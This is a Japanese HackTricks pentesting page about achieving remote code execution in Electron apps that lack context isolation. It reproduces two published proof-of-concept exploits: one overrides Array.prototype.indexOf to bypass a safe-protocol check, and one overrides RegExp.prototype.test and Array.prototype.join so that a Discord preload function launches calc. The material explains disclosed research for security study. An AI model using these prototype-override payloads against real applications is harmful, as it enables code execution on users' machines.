# ElectronのcontextIsolationを利用したRCE（リモートコード実行）のpreloadコード

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**

</details>

## 例1

[https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)からの例

このコードは、http(s)リンクをデフォルトのブラウザで開きます：

![](<../../../.gitbook/assets/image (375) (1) (1).png>)

`file:///C:/Windows/systemd32/calc.exe`のようなものを使用してcalcを実行することができますが、`SAFE_PROTOCOLS.indexOf`によって防止されています。

したがって、攻撃者はXSSまたは任意のページナビゲーションを介してこのJSコードを注入することができます：
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
```
以下は、エレクトロンデスクトップアプリケーションのXSSからRCEへの攻撃手法に関するハッキング書籍からの内容です。`SAFE_PROTOCOLS.indexOf`への呼び出しは常に1337を返すため、攻撃者は保護を回避し、calcを実行することができます。最終的な攻撃手法は以下の通りです。
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```
他の方法でプログラムを実行するために、許可を求めるプロンプトが表示されないようにするためのオリジナルのスライドを確認してください。

おそらく、コードをロードして実行する別の方法は、`file://127.0.0.1/electron/rce.jar`のようなものにアクセスすることです。

## 例2: DiscordアプリのRCE

例は[https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)から取得しました。

preloadスクリプトをチェックすると、Discordがウェブページに`DiscordNative.nativeModules.requireModule('MODULE-NAME')`を介して呼び出すことができる許可されたモジュールを公開していることがわかりました。\
ここでは、直接RCEに使用できる_child_process_モジュールなどのモジュールは使用できませんでしたが、**JavaScriptの組み込みメソッドをオーバーライドし、公開されたモジュールの実行に干渉することでRCEが達成できるコードを見つけました**。

以下はPoCです。DevToolsから"_discord_utils_"というモジュールで定義された`getGPUDriverVersions`関数を呼び出す際に、`RegExp.prototype.test`と`Array.prototype.join`をオーバーライドしながら、**calcアプリケーションが表示されることを確認できました**。
```javascript
RegExp.prototype.test=function(){
return false;
}
Array.prototype.join=function(){
return "calc";
}
DiscordNative.nativeModules.requireModule('discord_utils').getGPUDriverVersions();
```
`getGPUDriverVersions`関数は、以下のように"_execa_"ライブラリを使用してプログラムを実行しようとします。
```javascript
module.exports.getGPUDriverVersions = async () => {
if (process.platform !== 'win32') {
return {};
}

const result = {};
const nvidiaSmiPath = `${process.env['ProgramW6432']}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`;

try {
result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []));
} catch (e) {
result.nvidia = {error: e.toString()};
}

return result;
};
```
通常、_execa_は`nvidiaSmiPath`変数で指定された"_nvidia-smi.exe_"を実行しようとしますが、`RegExp.prototype.test`と`Array.prototype.join`が上書きされているため、**引数は_execa_の内部処理で"_calc_"に置換されます。

具体的には、次の2つの部分を変更することで引数が置換されます。

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36)

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**または**[telegramグループ](https://t.me/peass)**に参加するか、**Twitter**で**私をフォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
